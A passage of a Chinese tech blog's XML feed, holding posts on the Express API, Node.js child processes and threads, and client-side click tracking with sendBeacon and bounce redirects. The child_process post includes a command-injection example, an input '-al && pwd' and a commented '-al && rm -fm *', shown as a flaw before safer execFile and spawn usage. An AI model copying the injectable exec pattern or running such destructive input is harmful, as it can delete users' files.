        <content type="html"><![CDATA[<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><blockquote><p>主要 5 个部分</p></blockquote><ul><li>express.xxx</li><li>app.xxx</li><li>request.xxx</li><li>response.xxx</li><li>router.xxx</li></ul><h2 id="子应用"><a href="#子应用" class="headerlink" title="子应用"></a>子应用</h2><blockquote><p>const app &#x3D; express()<br>const admin &#x3D; express()</p><p>app.use(‘&#x2F;admin’, admin)</p></blockquote><h2 id="挂载点"><a href="#挂载点" class="headerlink" title="挂载点"></a>挂载点</h2><ul><li>‘admin’ 就是 admin 的挂载点</li></ul><h2 id="express-xxx"><a href="#express-xxx" class="headerlink" title="express.xxx"></a>express.xxx</h2><blockquote><p>概况：共 7 个 API</p></blockquote><h3 id="Methods"><a href="#Methods" class="headerlink" title="* Methods"></a>* <em>Methods</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#express.json">express.json()</a></li><li><a href="https://expressjs.com/en/4x/api.html#express.raw">express.raw()</a></li><li><a href="https://expressjs.com/en/4x/api.html#express.router">express.Router()</a></li><li><a href="https://expressjs.com/en/4x/api.html#express.static">express.static()</a></li><li><a href="https://expressjs.com/en/4x/api.html#express.text">express.text()</a></li><li><a href="https://expressjs.com/en/4x/api.html#express.urlencoded">express.urlencoded()</a></li></ul><ul><li><strong>常用，需要特别学习</strong></li><li>express.json()</li><li>express.static()</li><li>express.Router()</li></ul><h2 id="app-xxx"><a href="#app-xxx" class="headerlink" title="app.xxx"></a>app.xxx</h2><blockquote><p>概况：共 22 个 API</p></blockquote><h3 id="Properties"><a href="#Properties" class="headerlink" title="*   Properties"></a>*   <em>Properties</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#app.locals">app.locals</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.mountpath">app.mountpath</a></li></ul><h3 id="Events"><a href="#Events" class="headerlink" title="*   Events"></a>*   <em>Events</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#app.onmount">mount</a></li></ul><h3 id="Methods-1"><a href="#Methods-1" class="headerlink" title="*   Methods"></a>*   <em>Methods</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#app.all">app.all()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.delete.method">app.delete()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.disable">app.disable()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.disabled">app.disabled()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.enable">app.enable()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.enabled">app.enabled()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.engine">app.engine()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.get">app.get()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.get.method">app.get()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.listen">app.listen()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.METHOD">app.METHOD()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.param">app.param()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.path">app.path()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.post.method">app.post()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.put.method">app.put()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.render">app.render()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.route">app.route()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.set">app.set()</a></li><li><a href="https://expressjs.com/en/4x/api.html#app.use">app.use()</a></li></ul><ul><li><strong>常用，需要特别学习</strong></li><li>app.set(‘views’ | ‘view engine’, ‘xxx’)</li><li>app.get(‘env’)</li><li>app.get(‘&#x2F;xxx’, fn)</li><li>app.post &#x2F; app.put &#x2F; app.delete ….</li><li>app.render()</li><li>app.use()</li></ul><h2 id="request-xxx"><a href="#request-xxx" class="headerlink" title="request.xxx"></a>request.xxx</h2><blockquote><p>概况：共 28 个API</p></blockquote><h3 id="Properties-1"><a href="#Properties-1" class="headerlink" title="*   Properties"></a>*   <em>Properties</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#req.app">req.app</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.baseUrl">req.baseUrl</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.body">req.body</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.cookies">req.cookies</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.fresh">req.fresh</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.hostname">req.hostname</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.ip">req.ip</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.ips">req.ips</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.method">req.method</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.originalUrl">req.originalUrl</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.params">req.params</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.path">req.path</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.protocol">req.protocol</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.query">req.query</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.route">req.route</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.secure">req.secure</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.signedCookies">req.signedCookies</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.stale">req.stale</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.subdomains">req.subdomains</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.xhr">req.xhr</a></li></ul><h3 id="Methods-2"><a href="#Methods-2" class="headerlink" title="*   Methods"></a>*   <em>Methods</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#req.accepts">req.accepts()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.acceptsCharsets">req.acceptsCharsets()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.acceptsEncodings">req.acceptsEncodings()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.acceptsLanguages">req.acceptsLanguages()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.get">req.get()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.is">req.is()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.param">req.param()</a></li><li><a href="https://expressjs.com/en/4x/api.html#req.range">req.range()</a></li></ul><ul><li><strong>常用，需要特别学习</strong></li><li>req.get(‘Content-Type’)</li><li>req.param(‘name’)</li><li>req.range() <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests">参考</a></li></ul><h2 id="response-xxx"><a href="#response-xxx" class="headerlink" title="response.xxx"></a>response.xxx</h2><blockquote><p>概况：共 24 个 API</p></blockquote><h3 id="Properties-2"><a href="#Properties-2" class="headerlink" title="*   Properties"></a>*   <em>Properties</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#res.app">res.app</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.headersSent">res.headersSent</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.locals">res.locals</a></li></ul><h3 id="Methods-3"><a href="#Methods-3" class="headerlink" title="*   Methods"></a>*   <em>Methods</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#res.append">res.append()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.attachment">res.attachment()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.cookie">res.cookie()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.clearCookie">res.clearCookie()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.download">res.download()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.end">res.end()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.format">res.format()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.get">res.get()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.json">res.json()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.jsonp">res.jsonp()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.links">res.links()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.location">res.location()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.redirect">res.redirect()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.render">res.render()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.send">res.send()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.sendFile">res.sendFile()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.sendStatus">res.sendStatus()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.set">res.set()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.status">res.status()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.type">res.type()</a></li><li><a href="https://expressjs.com/en/4x/api.html#res.vary">res.vary()</a></li></ul><ul><li><strong>常用，需要特别学习</strong></li><li>res.send() &#x2F; res.sendFile()</li><li>res.render() &#x2F; res.download()</li><li>res.headersSent</li><li>res.status()</li><li>res.set() &#x2F; res.get()</li><li>res.format()</li></ul><h2 id="router-xxx"><a href="#router-xxx" class="headerlink" title="router.xxx"></a>router.xxx</h2><blockquote><p>概况： 共 5 个 API</p></blockquote><h3 id="Methods-4"><a href="#Methods-4" class="headerlink" title="*   Methods"></a>*   <em>Methods</em></h3><ul><li><a href="https://expressjs.com/en/4x/api.html#router.all">router.all()</a></li><li><a href="https://expressjs.com/en/4x/api.html#router.METHOD">router.METHOD()</a></li><li><a href="https://expressjs.com/en/4x/api.html#router.param">router.param()</a></li><li><a href="https://expressjs.com/en/4x/api.html#router.route">router.route()</a></li><li><a href="https://expressjs.com/en/4x/api.html#router.use">router.use()</a></li></ul><ul><li><strong>常用，需要特别学习</strong></li><li>没有</li><li>router 就是一个阉割版的 app</li></ul><h1 id="Express-API-总结"><a href="#Express-API-总结" class="headerlink" title="Express API 总结"></a>Express API 总结</h1><ul><li>五部分</li></ul><ol><li>express.xxx - 内置中间件</li><li>app.xxx - 应用设置（如：模块配置、中间件、挂载路由）</li><li>req.xxx - 操作请求</li><li>res.xxx - 操作响应</li><li>router.xxx - 操作路由</li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>child_process - 子进程</title>
      <link href="/Blog/2020/07/13/node_js/child_process-%E5%AD%90%E8%BF%9B%E7%A8%8B/index/"/>
      <url>/Blog/2020/07/13/node_js/child_process-%E5%AD%90%E8%BF%9B%E7%A8%8B/index/</url>
      
        <content type="html"><![CDATA[<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="定义"><a href="#定义" class="headerlink" title="- 定义"></a>- 定义</h2><ol><li>进程是程序的执行示例</li><li>程序在 CPU 上执行的活动叫做进程</li><li>实际上并没有明确的定义，只有一些规则</li></ol><h3 id="了解-CPU"><a href="#了解-CPU" class="headerlink" title="了解 CPU"></a>了解 CPU</h3><h4 id="特点"><a href="#特点" class="headerlink" title="- 特点"></a>- 特点</h4><ol><li>一个单核 CPU，在一个时刻，只能做一件事情</li><li>那么如何让用户同时看电影、听音乐、写代码的呢？</li><li>答案是在不同的进程中快速切换<em>（有多快呢？主要看 CPU 的主频，每秒几百万次也有可能）</em></li></ol><h4 id="多程序并发执行"><a href="#多程序并发执行" class="headerlink" title="多程序并发执行"></a>多程序并发执行</h4><ol><li>指多个程序在宏观上并行，微观上串行</li><li>每个进程会出现【执行 - 暂停 - 执行】的规律</li><li>多个进程之间会出现抢资源（如打印机）的现象</li></ol><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><h5 id="等待进程中的进程中"><a href="#等待进程中的进程中" class="headerlink" title="- 等待进程中的进程中"></a>- 等待进程中的进程中</h5><ol><li>都是非运行的状态</li><li>一些（A）在等待 CPU 资源</li><li>另一些（B）在等待 I&#x2F;O 完成（如文件读取）</li><li>如果这个时候把 CPU 分配给 B 进程，B 还是在等待 I&#x2F;O</li><li>我们把这个 B 叫做阻塞进程</li><li>因此，分派程序只会把CPU 分配给非阻塞进程</li></ol><h4 id="进程的三个状态"><a href="#进程的三个状态" class="headerlink" title="进程的三个状态"></a>进程的三个状态</h4><p><img src="/Blog/2020/07/13/node_js/child_process-%E5%AD%90%E8%BF%9B%E7%A8%8B/index/img.png"></p><h1 id="线程-Thread"><a href="#线程-Thread" class="headerlink" title="线程 Thread"></a>线程 Thread</h1><h2 id="分阶段"><a href="#分阶段" class="headerlink" title="- 分阶段"></a>- 分阶段</h2><p>在 linux 2.4 之前，操作系统只有进程没有线程</p><ol><li>在面向进程设计的系统中，进程是程序的基本执行实体</li><li>在面向线程设计的系统中，进程本身不是基本运行单位，还是线程的容器</li></ol><h2 id="引入原因"><a href="#引入原因" class="headerlink" title="- 引入原因"></a>- 引入原因</h2><ol><li>进程是执行的基本实体，也是资源分配的基本实体</li><li>导致进程的创建。切换、销毁太消耗CPU 时间了</li><li>于是引入线程，线程作为执行的基本实体</li><li>而进程只作为资源分配的基本实体</li></ol><h1 id="Node-js-的进程控制"><a href="#Node-js-的进程控制" class="headerlink" title="Node.js 的进程控制"></a>Node.js 的进程控制</h1><h1 id="Node-js-的线程控制"><a href="#Node-js-的线程控制" class="headerlink" title="Node.js 的线程控制"></a>Node.js 的线程控制</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>CPU 调度和执行的最小单位</li><li>一个进程中至少有一个线程，可以有多个线程</li><li>一个进程中的线程共享该进程的所有资源</li><li>进程的第一个线程叫做初始化线程</li><li>线程的调度可以由操作系统负责，也可以用户自己负责</li></ol><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ol><li>浏览器进程里面有渲染引擎、V8引擎、储存模块、网络模块。用户界面模块等</li><li>每个模块都可以放在一个线程里</li></ol><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>子进程 VS 线程</li><li>都能满足重开一个子任务，优先使用线程，除非你需要单独的资源分配</li></ul><h1 id="Node-js-中的-child-process-（用于新建子进程）"><a href="#Node-js-中的-child-process-（用于新建子进程）" class="headerlink" title="Node.js 中的 child_process （用于新建子进程）"></a>Node.js 中的 child_process （用于新建子进程）</h1><h2 id="使用目的"><a href="#使用目的" class="headerlink" title="- 使用目的"></a>- 使用目的</h2><ol><li>子进程的运行结果储存在系统缓存之中（最大200kb）</li><li>等到子进程运行结束以后，主进程再用回调函数读取子进程的运行结果</li></ol><h6 id="简单的-exec-栗子："><a href="#简单的-exec-栗子：" class="headerlink" title="简单的 exec 栗子："></a>简单的 exec 栗子：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = child_process</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;-al &amp;&amp; pwd&#x27;</span> <span class="comment">// &#x27;-al &amp;&amp; rm -fm *&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">exec</span>(<span class="string">`ls <span class="subst">$&#123;userInput&#125;</span>`</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stderr)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="有漏洞，可以被注入，可能执行意外的代码-如上-userInput"><a href="#有漏洞，可以被注入，可能执行意外的代码-如上-userInput" class="headerlink" title="有漏洞，可以被注入，可能执行意外的代码(如上 userInput)"></a>有漏洞，可以被注入，可能执行意外的代码(如上 userInput)</h6><h5 id="所以推荐使用-execFile（因为参数通过另外传参）"><a href="#所以推荐使用-execFile（因为参数通过另外传参）" class="headerlink" title="所以推荐使用 execFile（因为参数通过另外传参）"></a>所以推荐使用 execFile（因为参数通过另外传参）</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = child_process</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123; <span class="attr">pwd</span>: <span class="string">&#x27;C:\\&#x27;</span>, <span class="attr">env</span>: &#123; <span class="attr">NODE_ENV</span>: <span class="string">&#x27;development&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="comment">// options 常用的选项</span></span><br><span class="line"><span class="comment">// cwd - Current working directory</span></span><br><span class="line"><span class="comment">// env 环境变量</span></span><br><span class="line"><span class="comment">// shell 用什么 shell</span></span><br><span class="line"><span class="comment">// maxBuffer 最大缓存，默认 1024 * 1024 字节</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;-al &amp;&amp; pwd&#x27;</span> <span class="comment">// &#x27;-al &amp;&amp; rm -fm *&#x27;</span></span><br><span class="line"><span class="comment">// 这里会报错</span></span><br><span class="line"><span class="title function_">execFile</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-al&#x27;</span>, userInput], options, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stderr)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="相比上面更推荐使用-spawn"><a href="#相比上面更推荐使用-spawn" class="headerlink" title="相比上面更推荐使用 spawn"></a>相比上面更推荐使用 spawn</h5><ol><li>用法和 execFile 方法类似</li><li>没有回调函数，只能通过流事件获取结果</li><li>没有最大 200 kb 的限制（因为是流）<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = child_process</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;.&#x27;</span></span><br><span class="line"><span class="keyword">const</span> options = &#123; <span class="attr">pwd</span>: <span class="string">&#x27;C:\\&#x27;</span>, <span class="attr">env</span>: &#123; <span class="attr">NODE_ENV</span>: <span class="string">&#x27;development&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="keyword">const</span> streams = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-al&#x27;</span>, userInput], options)</span><br><span class="line">streams.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">chunk</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="但是我们最常用的还是-fork"><a href="#但是我们最常用的还是-fork" class="headerlink" title="但是我们最常用的还是 fork"></a>但是我们最常用的还是 fork</h4><ol><li>创建一个子进程，执行 Node 脚本（正因为如此，我们大多数时候都是执行 Node 脚本而不是 Bash，所以一般都用 fork）</li><li>fork(‘.&#x2F;child.js) 相当于 spawn(‘node’, [‘.&#x2F;child.js’])</li></ol><h6 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h6><ol><li>会多出一个 message 事件，用于父子通信</li><li>会多出一个 send 方法</li></ol><p>father.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = child_process.<span class="title function_">fork</span>(<span class="string">&#x27;./child.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">message</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或父给子发信息</span></span><br><span class="line"><span class="comment">// child.send(&#123; hello: &#x27;world&#x27; &#125;)</span></span><br></pre></td></tr></table></figure><p>child.js</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">setTimeout</span><span class="params">(()</span></span> =&gt; &#123;</span><br><span class="line">  process<span class="selector-class">.send</span>(<span class="string">&#x27;这是 child 传来的消息&#x27;</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">process<span class="selector-class">.on</span>(<span class="string">&#x27;message&#x27;</span>, message =&gt; &#123;</span><br><span class="line">  console<span class="selector-class">.log</span>(<span class="string">&#x27;这里接受父传子的消息&#x27;</span>)</span><br><span class="line">  console<span class="selector-class">.log</span>(message)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="一些历史"><a href="#一些历史" class="headerlink" title="一些历史"></a>一些历史</h2><p>为什么不用线程，因为太新了，而且效率不够高（<a href="https://nodejs.org/api/worker_threads.html#worker_threads_worker_threads">文档</a> <a href="http://nodejs.cn/api/worker_threads.html#worker_threads_worker_threads">中文</a>中写明）</p><ul><li><p><strong>child_process.exec</strong></p></li><li><p>v0.1.90 加入 Node.js</p></li><li><p><strong>new Worker</strong></p></li><li><p>v10.5.0 加入 Node.js (去年才加入)</p></li><li><p>v11.7.0 之前需要 –experimental-worker 开启</p></li></ul><p>简单介绍  worker_threads</p><ul><li>api 列表</li></ul><ol><li>isMainThread</li><li>new Worker(filename)</li><li>parentPort</li><li>postMessage</li></ol><ul><li>事件列表</li></ul><ol><li>message</li><li>exit</li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何用网页脚本追踪用户</title>
      <link href="/Blog/2020/07/10/essay/%E5%A6%82%E4%BD%95%E7%94%A8%E7%BD%91%E9%A1%B5%E8%84%9A%E6%9C%AC%E8%BF%BD%E8%B8%AA%E7%94%A8%E6%88%B7/index/"/>
      <url>/Blog/2020/07/10/essay/%E5%A6%82%E4%BD%95%E7%94%A8%E7%BD%91%E9%A1%B5%E8%84%9A%E6%9C%AC%E8%BF%BD%E8%B8%AA%E7%94%A8%E6%88%B7/index/</url>
      
        <content type="html"><![CDATA[<h2 id="一、同步-AJAX"><a href="#一、同步-AJAX" class="headerlink" title="一、同步 AJAX"></a>一、同步 AJAX</h2><p>不举例。<br>这种方法最大的问题在于，浏览器逐步将不允许在主线程上面，使用同步 AJAX。所以，上面代码实际上不能用。</p><h2 id="二、异步-AJAX"><a href="#二、异步-AJAX" class="headerlink" title="二、异步 AJAX"></a>二、异步 AJAX</h2><p>不举例。<br>异步 AJAX 其实是能用的。前提是unload事件里面，必须有一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。</p><h2 id="三、追踪用户点击"><a href="#三、追踪用户点击" class="headerlink" title="三、追踪用户点击"></a>三、追踪用户点击</h2><p>不举例。<br>setTimeout也能拖延页面卸载，保证异步请求发送成功。</p><h2 id="四、反弹追踪"><a href="#四、反弹追踪" class="headerlink" title="四、反弹追踪"></a>四、反弹追踪</h2><p>追踪用户点击，还可以使用反弹追踪（bounce tracking）。</p><p>所谓”反弹追踪”，就是网页跳转时，先跳到一个或多个中间网址，以便收集信息，然后再跳转到原来的目标网址。</p><p><img src="/Blog/2020/07/10/essay/%E5%A6%82%E4%BD%95%E7%94%A8%E7%BD%91%E9%A1%B5%E8%84%9A%E6%9C%AC%E8%BF%BD%E8%B8%AA%E7%94%A8%E6%88%B7/index/img.png"></p><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;a id=&quot;target&quot; href=&quot;https://baidu.com&quot;&gt;click&lt;/a&gt;</span></span><br><span class="line">const theLink = document.get<span class="constructor">ElementById(&#x27;<span class="params">target</span>&#x27;)</span>;</span><br><span class="line"></span><br><span class="line">theLink.add<span class="constructor">EventListener(&#x27;<span class="params">click</span>&#x27;, <span class="params">function</span> (<span class="params">event</span>)</span> &#123;</span><br><span class="line">  event.prevent<span class="constructor">Default()</span>;</span><br><span class="line">  window.location.href = &#x27;/jump?url=&#x27; + </span><br><span class="line">    encode<span class="constructor">URIComponent(<span class="params">theLink</span>.<span class="params">getAttribute</span>(&#x27;<span class="params">href</span>&#x27;)</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>上面代码中，用户点击的时候，会强制跳到一个中间网址，将信息携带过去，处理完毕以后，再跳到原始的目标网址。</p><p>谷歌和百度现在都是这样做，点击搜索结果时，会反弹多次，才跳到目标网址。</p><h2 id="五、Beacon-API"><a href="#五、Beacon-API" class="headerlink" title="五、Beacon API"></a>五、Beacon API</h2><p>上面这些做法，都会延缓网页卸载，严重影响用户体验。</p><p>为了解决网页卸载时，异步请求无法成功的问题，浏览器特别实现了一个 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Beacon_API">Beacon API</a>，允许异步请求脱离当前主线程，放到浏览器进程里面发出，这样可以保证一定能发出。</p><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">window.add<span class="constructor">EventListener(&#x27;<span class="params">unload</span>&#x27;, <span class="params">function</span> (<span class="params">event</span>)</span> &#123;</span><br><span class="line">  navigator.send<span class="constructor">Beacon(&#x27;<span class="operator">/</span><span class="params">log</span>&#x27;, &#x27;<span class="params">foo</span>=<span class="params">bar</span>&#x27;)</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>上面代码中，<code>navigator.sendBeacon()</code>方法可以保证，异步请求一定会发出。第一个参数是请求的网址，第二个参数是发送的数据。</p><p><strong>注意</strong>，Beacon API 发出的是 POST 请求。<em>Beacon API 一个页面有发送次数限制</em></p><h2 id="六、ping-属性"><a href="#六、ping-属性" class="headerlink" title="六、ping 属性"></a>六、ping 属性</h2><p>HTML 的<code>&lt;a&gt;</code>标签有一个<code>ping</code>属性，只要用户点击，就会向该属性指定的网址，发出一个 POST 请求。</p><blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href<span class="operator">=</span><span class="string">&quot;https://baidu.com&quot;</span> ping<span class="operator">=</span><span class="string">&quot;/log?foo=bar&quot;</span>&gt;</span><br><span class="line">  click</span><br><span class="line">&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>上面代码中，用户点击跳转时，会向<code>/log</code>这个网址发一个 POST 请求。</p><p><code>ping</code>属性无法指定数据体，似乎只能通过 URL 的查询字符串携带信息。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Stream - 流</title>
      <link href="/Blog/2020/06/29/node_js/Stream-%E6%B5%81/index/"/>
      <url>/Blog/2020/06/29/node_js/Stream-%E6%B5%81/index/</url>
      
